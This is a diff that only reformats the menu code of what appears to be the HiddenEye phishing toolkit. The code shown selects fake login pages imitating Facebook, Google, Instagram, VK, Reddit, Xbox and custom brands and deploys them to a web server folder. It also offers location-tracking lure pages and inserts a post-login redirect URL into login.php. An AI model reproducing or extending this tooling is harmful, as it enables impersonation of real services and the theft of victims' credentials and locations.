@@ -34,9 +34,11 @@ def start_main_menu():
     print(localization.lang_start_main_menu["down_line"])
     print(localization.lang_start_main_menu["attack_vector_message"])
     print(localization.lang_start_main_menu["phishing_modules_header"])
-    print_sorted_as_menu(localization.lang_start_main_menu["phishing_modules_list"])
+    print_sorted_as_menu(
+        localization.lang_start_main_menu["phishing_modules_list"])
     print(localization.lang_start_main_menu["additional_modules"])
-    print_sorted_as_menu(localization.lang_start_main_menu["additional_modules_list"])
+    print_sorted_as_menu(
+        localization.lang_start_main_menu["additional_modules_list"])
 
     option = input(global_localization.input_line)
     option = option.zfill(2)
@@ -44,16 +46,14 @@ def start_main_menu():
         module_loading_message("Facebook")
         print(localization.lang_start_main_menu["operation_mode"])
         print_sorted_as_menu(
-            localization.lang_start_main_menu["facebook_operation_modes"]
-        )
+            localization.lang_start_main_menu["facebook_operation_modes"])
         customOption = input(global_localization.input_line)
         start_phishing_page("Facebook", customOption)
     elif option == "02":
         module_loading_message("Google")
         print(localization.lang_start_main_menu["operation_mode"])
         print_sorted_as_menu(
-            localization.lang_start_main_menu["google_operation_modes"]
-        )
+            localization.lang_start_main_menu["google_operation_modes"])
         customOption = input(global_localization.input_line)
         start_phishing_page("Google", customOption)
     elif option == "03":
@@ -80,8 +80,7 @@ def start_main_menu():
         module_loading_message("Instagram")
         print(localization.lang_start_main_menu["operation_mode"])
         print_sorted_as_menu(
-            localization.lang_start_main_menu["instagram_operation_modes"]
-        )
+            localization.lang_start_main_menu["instagram_operation_modes"])
         customOption = input(global_localization.input_line)
         start_phishing_page("Instagram", customOption)
     elif option == "09":
@@ -107,7 +106,8 @@ def start_main_menu():
     elif option == "14":
         module_loading_message("VK")
         print(localization.lang_start_main_menu["operation_mode"])
-        print_sorted_as_menu(localization.lang_start_main_menu["VK_operation_modes"])
+        print_sorted_as_menu(
+            localization.lang_start_main_menu["VK_operation_modes"])
         customOption = input(global_localization.input_line)
         start_phishing_page("VK", customOption)
     elif option == "15":
@@ -194,8 +194,7 @@ def start_main_menu():
         module_loading_message("Reddit")
         print(localization.lang_start_main_menu["operation_mode"])
         print_sorted_as_menu(
-            localization.lang_start_main_menu["reddit_operation_modes"]
-        )
+            localization.lang_start_main_menu["reddit_operation_modes"])
         customOption = input(global_localization.input_line)
         start_phishing_page("Reddit", customOption)
     elif option == "36":
@@ -218,17 +217,14 @@ def start_main_menu():
         module_loading_message("CUSTOM(2)")
         customOption = ""
         start_phishing_page("CUSTOM(2)", customOption)
-
         """PHISHING MODULES BELOW"""
 
     elif option == "0A":
         module_loading_message("LOCATION")
         print(localization.lang_start_main_menu["operation_mode"])
         print_sorted_as_menu(
-            localization.lang_start_main_menu[
-                "additional_module_location_operation_modes"
-            ]
-        )
+            localization.
+            lang_start_main_menu["additional_module_location_operation_modes"])
         customOption = input(global_localization.input_line)
         start_phishing_page("LOCATION", customOption)
 
@@ -350,40 +346,24 @@ def start_phishing_page(page, custom_option):  # Phishing pages selection menu
     elif page == "Xbox":
         webpage_set("WebPages/xbox/", "Server/www/")
     elif page == "CUSTOM(1)":
+        print(localization.lang_start_phishing_page["custom_folder_directory"].
+              format(page=page))
         print(
-            localization.lang_start_phishing_page["custom_folder_directory"].format(
-                page=page
-            )
-        )
-        print(
-            localization.lang_start_phishing_page["manual_reading_suggestion"].format(
-                page=page
-            )
-        )
-        input(
-            localization.lang_start_phishing_page[
-                "press_enter_to_contunue_if_setup_correctly"
-            ]
-        )
+            localization.lang_start_phishing_page["manual_reading_suggestion"].
+            format(page=page))
+        input(localization.lang_start_phishing_page[
+            "press_enter_to_contunue_if_setup_correctly"])
         print(localization.lang_start_phishing_page["copying_your_files"])
         wait(3)
         webpage_set("WebPages/CUSTOM(1)/", "Server/www/")
     elif page == "CUSTOM(2)":
+        print(localization.lang_start_phishing_page["custom_folder_directory"].
+              format(page=page))
         print(
-            localization.lang_start_phishing_page["custom_folder_directory"].format(
-                page=page
-            )
-        )
-        print(
-            localization.lang_start_phishing_page["manual_reading_suggestion"].format(
-                page=page
-            )
-        )
-        input(
-            localization.lang_start_phishing_page[
-                "press_enter_to_contunue_if_setup_correctly"
-            ]
-        )
+            localization.lang_start_phishing_page["manual_reading_suggestion"].
+            format(page=page))
+        input(localization.lang_start_phishing_page[
+            "press_enter_to_contunue_if_setup_correctly"])
         print(localization.lang_start_phishing_page["copying_your_files"])
         wait(3)
         webpage_set("WebPages/CUSTOM(2)/", "Server/www/")
@@ -393,21 +373,15 @@ def start_phishing_page(page, custom_option):  # Phishing pages selection menu
         wait(3)
         webpage_set("WebPages/TOOLS/nearyou", "Server/www/")
         print(localization.lang_start_phishing_page["https_suggestion"])
-        input(
-            localization.lang_start_phishing_page[
-                "press_enter_to_contunue_if_setup_correctly"
-            ]
-        )
+        input(localization.lang_start_phishing_page[
+            "press_enter_to_contunue_if_setup_correctly"])
     elif custom_option == "2" and page == "LOCATION":
         wait(3)
         webpage_set("WebPages/TOOLS/gdrive", "Server/www/")
         print(localization.lang_start_phishing_page["https_suggestion"])
         print(localization.lang_start_phishing_page["gdrive_suggestion"])
-        input(
-            localization.lang_start_phishing_page[
-                "press_enter_to_contunue_if_setup_correctly"
-            ]
-        )
+        input(localization.lang_start_phishing_page[
+            "press_enter_to_contunue_if_setup_correctly"])
 
     else:
         run_command("clear")
@@ -416,18 +390,18 @@ def start_phishing_page(page, custom_option):  # Phishing pages selection menu
         start_main_menu()
 
 
-def enter_custom_redirecting_url():  # Question where user can input custom web-link
+def enter_custom_redirecting_url(
+):  # Question where user can input custom web-link
     run_command("clear")
     print(global_localization.hidden_eye_logo)
     print(global_localization.official_website_link)
     print(global_localization.by_darksec)
-    print(
-        localization.lang_enter_custom_redirecting_url["enter_redirecting_url_header"]
-    )
-    print(
-        localization.lang_enter_custom_redirecting_url["enter_redirecting_url_prompt"]
-    )
-    custom = input(localization.lang_enter_custom_redirecting_url["redirect_here"])
+    print(localization.
+          lang_enter_custom_redirecting_url["enter_redirecting_url_header"])
+    print(localization.
+          lang_enter_custom_redirecting_url["enter_redirecting_url_prompt"])
+    custom = input(
+        localization.lang_enter_custom_redirecting_url["redirect_here"])
     if "http://" in custom or "https://" in custom:
         pass
     else:
@@ -442,7 +416,8 @@ def enter_custom_redirecting_url():  # Question where user can input custom web-
         f.write(c)
         f.close()
 
-    if path.exists("Server/www/post.php") and path.exists("Server/www/login.php"):
+    if path.exists("Server/www/post.php") and path.exists(
+            "Server/www/login.php"):
         with open("Server/www/login.php") as f:
             read_data = f.read()
         c = read_data.replace("<CUSTOM>", custom)
